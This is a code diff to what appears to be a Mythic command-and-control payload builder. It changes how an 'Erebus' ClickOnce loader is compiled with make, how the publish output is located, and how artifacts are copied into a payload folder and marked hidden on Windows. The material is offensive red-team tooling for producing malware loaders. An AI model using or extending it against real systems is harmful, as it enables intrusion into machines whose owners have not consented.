@@ -1398,11 +1398,16 @@ generated if none have been entered.""",
                         return response
 
                     # Compile ClickOnce Loader using Makefile
+                    # Makefile target "publish" automatically handles build, cleanup, and verification
+                    build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
+                    rid = self.get_parameter('0.4 ClickOnce RID') or "win-x64"
+                    
                     cmd = [
                         "make",
                         "-C",
                         clickonce_loader_path,
-                        f"CONFIG={self.get_parameter('0.3 ClickOnce Build Configuration')}",
+                        f"CONFIG={build_config}",
+                        f"RID={rid}",
                         "publish"
                     ]
 
@@ -1417,35 +1422,43 @@ generated if none have been entered.""",
                         output += f"[stdout]\n{stdout.decode(errors='replace')}"
                     if stderr:
                         output += f"[stderr]\n{stderr.decode(errors='replace')}"
+                    
+                    if process.returncode != 0:
+                        response.status = BuildStatus.Error
+                        response.build_message = f"Makefile publish target failed with exit code {process.returncode}"
+                        response.build_stderr = output
+                        await SendMythicRPCPayloadUpdatebuildStep(
+                            MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Compiling ClickOnce Loader",
+                            StepStdout=f"Makefile publish failed",
+                            StepSuccess=False,
+                        ))
+                        return response
 
-                    # Locate publish output dynamically: bin/{config}/{tfm}/{rid}/publish
-                    publish_root = Path(clickonce_loader_path) / "bin" / f"{self.get_parameter('0.3 ClickOnce Build Configuration')}"
-
-                    tfm_dir = None
-                    if publish_root.exists():
-                        for child in publish_root.iterdir():
-                            if child.is_dir() and child.name.startswith("net") and "-windows" in child.name:
-                                tfm_dir = child
-                                break
+                    # Locate publish output: bin/{config}/{tfm}/{rid}/publish
+                    # Makefile ensures cleanup happens, so all remaining files are needed
+                    publish_root = Path(clickonce_loader_path) / "bin" / build_config
 
                     publish_dir = None
-                    if tfm_dir:
-                        rid_dir = None
-                        for child in tfm_dir.iterdir():
-                            if child.is_dir():
-                                rid_dir = child
-                                break
-                        if rid_dir and (rid_dir / "publish").exists():
-                            publish_dir = rid_dir / "publish"
-                        elif (tfm_dir / "publish").exists():
-                            publish_dir = tfm_dir / "publish"
-                        else:
-                            publish_dir = tfm_dir
+                    if publish_root.exists():
+                        # Traverse: CONFIG/TFM/RID/publish
+                        for tfm_dir in publish_root.iterdir():
+                            if tfm_dir.is_dir() and "net" in tfm_dir.name and "-windows" in tfm_dir.name:
+                                # Found TFM directory (e.g., net7.0-windows)
+                                for rid_dir in tfm_dir.iterdir():
+                                    if rid_dir.is_dir():
+                                        candidate = rid_dir / "publish"
+                                        if candidate.exists():
+                                            publish_dir = candidate
+                                            break
+                                if publish_dir:
+                                    break
 
                     if not publish_dir or not publish_dir.exists():
                         response.status = BuildStatus.Error
-                        response.build_message = "Failed to locate ClickOnce publish output"
-                        response.build_stderr = output
+                        response.build_message = "Failed to locate ClickOnce publish output directory"
+                        response.build_stderr = output + f"\nSearched in: {publish_root}"
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
@@ -1455,55 +1468,59 @@ generated if none have been entered.""",
                         ))
                         return response
 
-                  # Prefer exe if present, else fall back to dll (non-Windows publish may omit host exe)
-                    clickonce_exe = publish_dir / "Erebus.ClickOnce.exe"
-                    clickonce_dll = publish_dir / "Erebus.ClickOnce.dll"
-                    clickonce_application = publish_dir / "Erebus.ClickOnce.application"
-
+                    # Copy cleaned artifacts from publish directory to payload directory
+                    # Makefile cleanup removes debug symbols and unnecessary runtime files
                     payload_dir = Path(agent_build_path) / "payload"
                     payload_dir.mkdir(parents=True, exist_ok=True)
 
-                    # Copy all publish artifacts into payload directory and hide them
+                    # Copy all files from publish directory (already cleaned by Makefile)
                     for item in publish_dir.iterdir():
                         if item.is_file():
                             dest_path = payload_dir / item.name
                             shutil.copy2(str(item), str(dest_path))
+                            # Try to hide files on Windows
                             try:
                                 import ctypes
                                 FILE_ATTRIBUTE_HIDDEN = 0x02
                                 ctypes.windll.kernel32.SetFileAttributesW(str(dest_path), FILE_ATTRIBUTE_HIDDEN)
                             except:
-                                # If not on Windows or ctypes fails, silently continue
                                 pass
 
-                    # Log available files
-                    output += f"[DEBUG] Contents of publish_dir:\n"
+                    # Log available files after cleanup
+                    output += f"[DEBUG] Cleaned publish artifacts:\n"
                     for item in publish_dir.iterdir():
-                        output += f"  - {item.name}\n"
+                        if item.is_file():
+                            output += f"  - {item.name} ({item.stat().st_size} bytes)\n"
+
+                    # Locate main executable (Makefile ensures it exists)
+                    clickonce_exe = publish_dir / "Erebus.ClickOnce.exe"
+                    clickonce_dll = publish_dir / "Erebus.ClickOnce.dll"
 
                     if clickonce_exe.exists():
-                        shutil.move(str(payload_dir / "Erebus.ClickOnce.exe"), payload_path)
-                        response.build_stdout = output + "\n" + payload_path
+                        # Copy exe as primary payload
+                        shutil.copy2(str(clickonce_exe), str(payload_path))
+                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path}"
+                        response.status = BuildStatus.Success
+                        response.build_message = "ClickOnce Loader compiled successfully!"
                     elif clickonce_dll.exists():
+                        # Fallback to DLL if exe not present
                         payload_path_dll = Path(payload_path).with_suffix(".dll")
-
-                        shutil.move(str(payload_dir / "Erebus.ClickOnce.dll"), payload_path_dll)
-                        response.build_stdout = output + "\n" + str(payload_path_dll)
+                        shutil.copy2(str(clickonce_dll), str(payload_path_dll))
+                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path_dll}"
+                        response.status = BuildStatus.Success
+                        response.build_message = "ClickOnce Loader compiled successfully!"
                     else:
                         response.status = BuildStatus.Error
-                        response.build_message = "Failed to compile ClickOnce loader - no exe or dll produced"
-                        response.build_stderr = output
+                        response.build_message = "Failed to locate compiled ClickOnce executable"
+                        response.build_stderr = output + "\nNo .exe or .dll found in publish directory"
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
                             StepName="Compiling ClickOnce Loader",
-                            StepStdout="Failed to Compile ClickOnce Loader",
+                            StepStdout="Failed to locate executable",
                             StepSuccess=False,
                         ))
                         return response
-
-                    response.status = BuildStatus.Success
-                    response.build_message = "ClickOnce Loader Compiled!"
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
